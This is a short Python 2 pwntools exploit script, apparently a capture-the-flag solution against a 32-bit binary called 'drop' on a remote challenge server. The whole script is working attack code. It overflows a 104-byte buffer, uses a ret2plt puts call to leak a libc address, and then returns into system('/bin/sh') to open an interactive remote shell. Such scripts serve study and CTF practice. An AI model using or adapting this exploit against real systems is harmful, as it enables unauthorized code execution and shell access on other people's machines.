#!/usr/bin/env python2

from pwn import *

context.bits = 32

elf = ELF('./drop')
libc = ELF('./libc.so.6')

#p = process('./drop')
p = remote('prob.vulnerable.kr', 20002)

puts = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

context.terminal = ['tmux', 'new-window']
#gdb.attach(p, 'b *0x08048673')

p.recv()
p.sendline('1')

p.recv()

payload = flat(
    'A'*104,
    puts,
    main,
    puts_got,
)

p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
p.recvline()

leak = u32(p.recv(4))
libc.address = leak - libc.sym['puts']
system = libc.sym['system']
bin_sh = next(libc.search('/bin/sh'))

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))

p.recv()
p.sendline('1')

p.recv()

payload = flat(
    'A'*104,
    system,
    0xdeadbeef,
    bin_sh
)

p.sendline(payload)
p.interactive()

